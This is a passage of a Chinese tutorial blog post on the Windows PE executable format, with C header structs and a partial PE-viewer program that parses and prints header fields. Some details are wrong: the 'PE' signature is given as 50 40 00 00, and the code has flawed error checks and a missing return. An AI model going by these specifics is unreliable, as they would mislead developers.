    <content type="html"><![CDATA[<p>梳理下PE的文件结构</p><a id="more"></a><h2 id="PE整体结构"><a href="#PE整体结构" class="headerlink" title="PE整体结构"></a>PE整体结构</h2><p>PE结构可以大致分为:</p><ul><li>DOS部分</li><li>NT头</li><li>节表(块表)</li><li>节数据(块数据)</li><li>调试信息</li></ul><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number (标志,不会变的标志)</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>IMAGE_DOS_HEADER结构体的大小为64字节。在该结构中必须知道两个重要成员: e_magic与e_lfanew</p><ul><li>e_magic: DOS签名(signature)</li><li>e_lfanew: 只是NT头的偏移</li></ul><p><strong>主要通过它里面的e_magic和e_lfanew来判断该文件是否是PE文件格式。</strong></p><h2 id="NT头"><a href="#NT头" class="headerlink" title="NT头"></a>NT头</h2><p>PE文件头由PE文件头标志，标准PE头，扩展PE头三部分组成。PE文件头标志自然是50 40 00 00，也就是’PE’，我们从结构体的角度看一下PE文件头的详细信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature; <span class="comment">//NT头标志 =&gt; 4字节</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader; <span class="comment">//文件头 =&gt; 20字节</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">//扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>文件头是表现文件大致属性的IMAGE_FILE_HEADER结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine; <span class="comment">//可以运行在什么平台上 任意:0 ,Intel 386以及后续:14C x64:8664</span></span><br><span class="line">    WORD    NumberOfSections; <span class="comment">//节的数量</span></span><br><span class="line">    DWORD   TimeDateStamp; <span class="comment">//编译器填写的时间戳</span></span><br><span class="line">    DWORD   PointerToSymbolTable;   <span class="comment">//调试相关</span></span><br><span class="line">    DWORD   NumberOfSymbols; <span class="comment">//调试相关</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;   <span class="comment">//标识扩展PE头大小</span></span><br><span class="line">    WORD    Characteristics;        <span class="comment">//文件属性 =&gt; 16进制转换为2进制根据哪些位有1,可以查看相关属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p><strong>这个结构体主要包含了，CPU的Machine码，节区数量，需要装载的可选头的大小和文件属性等信息。</strong></p><h3 id="可选头"><a href="#可选头" class="headerlink" title="可选头"></a>可选头</h3><p>可选头包含了很多信息，重点关注：</p><ul><li>代码起始地址 AdressOfEntryPoint</li><li>加载基址 ImageBase。执行PE文件时，PE装载器先创建进程，再将文件载入内存，然后再把EIP寄存器的值设为ImgeBase+AddressOfEntryPoint</li><li>文件对齐和节区对齐的值</li><li>PE头的大小和Image的大小</li><li>IMAGE_DATA_DIRECTORY的表(包含了很多重要的表，例如导入表导出表等)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;<span class="comment">//PE32: 10B PE64: 20B</span></span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;<span class="comment">//所有含有代码的区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   SizeOfInitializedData;<span class="comment">//所有初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;<span class="comment">//所有含未初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;<span class="comment">//程序入口RVA</span></span><br><span class="line">    DWORD   BaseOfCode;<span class="comment">//代码区块起始RVA</span></span><br><span class="line">    DWORD   BaseOfData;<span class="comment">//数据区块起始RVA</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;<span class="comment">//内存镜像基址(程序默认载入基地址)</span></span><br><span class="line">    DWORD   SectionAlignment; <span class="comment">//内存中对齐大小</span></span><br><span class="line">    DWORD   FileAlignment; <span class="comment">//文件中对齐大小(提高程序运行效率)</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;<span class="comment">//内存中整个PE文件的映射的尺寸,可比实际值大,必须是SectionAlignment的整数倍</span></span><br><span class="line">    DWORD   SizeOfHeaders; <span class="comment">//所有的头加上节表文件对齐之后的值</span></span><br><span class="line">    DWORD   CheckSum;<span class="comment">//映像校验和,一些系统.dll文件有要求,判断是否被修改</span></span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;<span class="comment">//文件特性,不是针对DLL文件的,16进制转换2进制可以根据属性对应的表格得到相应的属性</span></span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">//数据目录表,结构体数组</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><h2 id="节区头"><a href="#节区头" class="headerlink" title="节区头"></a>节区头</h2><p>节区头是由IMAGE_SECTION_HEADER结构体组成的数组，每个结构体对应一个节区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//ASCII字符串 可自定义 只截取8个字节</span></span><br><span class="line">    <span class="keyword">union</span> &#123;   <span class="comment">//该节在没有对齐之前的真实尺寸,该值可以不准确</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;    <span class="comment">//内存中的偏移地址</span></span><br><span class="line">    DWORD   SizeOfRawData;   <span class="comment">//节在文件中对齐的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData;   <span class="comment">//节区在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;   <span class="comment">//节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>主要包含了节区的偏移地址，对齐和节的属性等信息</p><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>导出表(Export Table)一般是DLL文件用的比较多，exe文件很少有导出表，导出表的数据结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;<span class="comment">// 指针指向该导出表文件名字符串</span></span><br><span class="line">    DWORD   Base;<span class="comment">// 导出函数起始序号</span></span><br><span class="line">    DWORD   NumberOfFunctions;<span class="comment">// 所有导出函数的个数</span></span><br><span class="line">    DWORD   NumberOfNames;<span class="comment">// 以函数名字导出的函数个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// 指针指向导出函数地址表RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 指针指向导出函数名称表RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// 指针指向导出函数序号表RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA 指向 INT (PIMAGE_THUNK_DATA结构数组)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;<span class="comment">//RVA指向dll名字,以0结尾</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA 指向 IAT (PIMAGE_THUNK_DATA结构数组)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>可以看到，OriginalFirstThunk 和 FirstThunk 指向的内容分别是 INT 和 IAT ，但实际上 INT 和 IAT 的内容是一样的，所以他们指向的内容是一样的，只是方式不同而已，下图可以完美的解释</p><p><img src="/08/ckur473de000rab15shv2m7ap/1.jpg" alt></p><p>但是上图只是PE文件加载前的情况，PE文件一旦运行起来，就会变成下图的情况</p><p><img src="/08/ckur473de000rab15shv2m7ap/2.jpg" alt></p><h2 id="PE-Viewer"><a href="#PE-Viewer" class="headerlink" title="PE-Viewer"></a>PE-Viewer</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication3.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RVAOffset</span><span class="params">(PIMAGE_NT_HEADERS pNtHeader, DWORD Rva)</span> </span>&#123;</span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHeader);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">DWORD SectionBeginRva = pSectionHeader[i].VirtualAddress;</span><br><span class="line">DWORD SectionEndRva = pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData;</span><br><span class="line"><span class="keyword">if</span> (Rva &gt;= SectionBeginRva &amp;&amp; Rva &lt;= SectionEndRva) &#123;</span><br><span class="line">DWORD Temp = Rva - SectionBeginRva;</span><br><span class="line">DWORD Rwa = Temp + pSectionHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">return</span> Rwa;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile;</span><br><span class="line">HANDLE hMapping;</span><br><span class="line">WCHAR szFilePath[MAX_PATH];</span><br><span class="line">LPVOID ImageBase;</span><br><span class="line">PIMAGE_DOS_HEADER  pDH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_DOS结构的指针</span></span><br><span class="line">PIMAGE_NT_HEADERS  pNtH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_NT结构的指针</span></span><br><span class="line">PIMAGE_FILE_HEADER pFH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_FILE结构的指针</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOH = <span class="literal">NULL</span>;<span class="comment">//指向IMAGE_OPTIONALE结构的指针</span></span><br><span class="line">OPENFILENAME ofn;<span class="comment">//定义结构，调用打开对话框选择要分析的文件及其保存路径</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(szFilePath, <span class="number">0</span>, MAX_PATH);</span><br><span class="line"><span class="built_in">memset</span>(&amp;ofn, <span class="number">0</span>, <span class="keyword">sizeof</span>(ofn));</span><br><span class="line"></span><br><span class="line"><span class="comment">//打开一个窗口，选择文件</span></span><br><span class="line">ofn.lStructSize = <span class="keyword">sizeof</span>(ofn);</span><br><span class="line">ofn.hwndOwner = <span class="literal">NULL</span>;</span><br><span class="line">ofn.hInstance = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">ofn.nMaxFile = MAX_PATH;</span><br><span class="line">ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;</span><br><span class="line">ofn.lpstrInitialDir = <span class="string">L"."</span>;</span><br><span class="line">ofn.lpstrFile = szFilePath;</span><br><span class="line">ofn.lpstrTitle = <span class="string">L"chose a PE file --by w00d"</span>;</span><br><span class="line">ofn.lpstrFilter = <span class="string">L"*.*\0*.*\0"</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetOpenFileName(&amp;ofn)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"打开文件错误:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hFile = CreateFile(szFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!hFile) &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"打开文件错误"</span>, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hMapping = CreateFileMapping(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!hMapping) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"创建映射错误%d"</span>, GetLastError());</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">ImageBase = MapViewOfFile(hMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ImageBase) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"文件映射错误:%d"</span>, GetLastError());</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*  PE头的判断                                 */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--------------------PEheader------------------------\n"</span>);</span><br><span class="line">pDH = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line"><span class="keyword">if</span> (pDH-&gt;e_magic != IMAGE_DOS_SIGNATURE) <span class="comment">//判断是否是MZ</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Not a valid PE file 2!\n"</span>);</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pNtH = (PIMAGE_NT_HEADERS)((DWORD)pDH + pDH-&gt;e_lfanew); <span class="comment">//判断是否为PE格式</span></span><br><span class="line"><span class="keyword">if</span> (pNtH-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Not a valid PE file 3!\n"</span>);</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"PE e_lfanew is: 0x%x\n"</span>, pNtH);</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*  FileHeader                                */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line">pFH = &amp;pNtH-&gt;FileHeader;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-----------------FileHeader------------------------\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"NumberOfSections: %d\n"</span>, pFH-&gt;NumberOfSections);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SizeOfOptionalHeader: %d\n"</span>, pFH-&gt;SizeOfOptionalHeader);</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*  OptionalHeader                            */</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line">pOH = &amp;pNtH-&gt;OptionalHeader;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-----------------OptionalHeader---------------------\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SizeOfCode:0x%08x\n"</span>, pOH-&gt;SizeOfCode);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"AddressOfEntryPoint: 0x%08X\n"</span>, pOH-&gt;AddressOfEntryPoint);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ImageBase is 0x%x\n"</span>, ImageBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"SectionAlignment: 0x%08x\n"</span>, pOH-&gt;SectionAlignment);</span><br><span class="line"><span 